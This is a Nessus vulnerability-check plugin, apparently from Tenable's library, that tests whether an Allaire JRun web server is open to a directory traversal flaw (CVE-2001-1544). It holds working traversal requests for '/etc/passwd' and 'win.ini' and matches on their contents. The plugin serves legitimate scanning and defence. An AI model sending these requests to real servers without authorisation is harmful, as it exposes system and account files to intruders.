#
# This script was written by H D Moore
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID
#
# Changes by Tenable:
# - Revised plugin title (2/05/2009)

include("compat.inc");

if(description)
{
    script_id(10997);
    script_version ("$Revision: 1.21 $");

    script_cve_id("CVE-2001-1544");
    script_bugtraq_id(3666);
    script_xref(name:"OSVDB", value:"819");

    script_name(english:"JRun Web Server (JWS) GET Request Traversal Arbitrary File Access");
    script_summary(english:"Attempts directory traversal attack");

     script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a directory traversal attack.");
     script_set_attribute(attribute:"description", value:
"This host is running the Allaire JRun web server.  Versions 2.3.3,
3.0, and 3.1 are vulnerable to a directory traversal attack.  This
allows a potential intruder to view the contents of any file on the
system.");
     script_set_attribute(attribute:"solution", value:
"The vendor has addressed this issue in Macromedia Product Security
Bulletin MPSB01-17.");
    script_set_attribute(attribute:"cvss_vector", value:
"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
    script_set_attribute(attribute:"plugin_publication_date", value:
"2002/06/05");
    script_end_attributes();

    script_category(ACT_GATHER_INFO);

    script_copyright(english:"This script is Copyright (C) 2002-2009 Digital Defense Inc.");
    script_family(english:"CGI abuses");
    script_dependencie("find_service1.nasl", "http_version.nasl");
    script_require_ports("Services/www", 8000);
    script_require_keys("www/jrun");
    exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

req_unx = "/../../../../../../../../etc/passwd"; 	pat_unx = "root:";
req_win = "/..\..\..\..\..\..\..\..\winnt\win.ini"; 	pat_win = "[fonts]";

port = get_http_port(default:8000);

wkey = string("web/traversal/", port);

trav = get_kb_item(wkey);
if (trav) exit(0);

if(get_port_state(port))
{
    req = http_get(item:req_unx, port:port);      
    res = http_keepalive_send_recv(data:req, port:port);
    if ( isnull(res)) exit(0);
    
    if(pat_unx >< res)
    {
        wkey = string("web/traversal/", port);
        set_kb_item(name:wkey, value:TRUE);
        security_warning(port);
        exit(0);
    }
    
    req = http_get(item:req_win, port:port);      
    res = http_keepalive_send_recv(port:port, data:req);
    if ( res == NULL ) exit(0);

    if(pat_win >< res)
    {
        wkey = string("web/traversal/", port);
        set_kb_item(name:wkey, value:TRUE);    
        security_warning(port);
        exit(0);
    }  
}
 
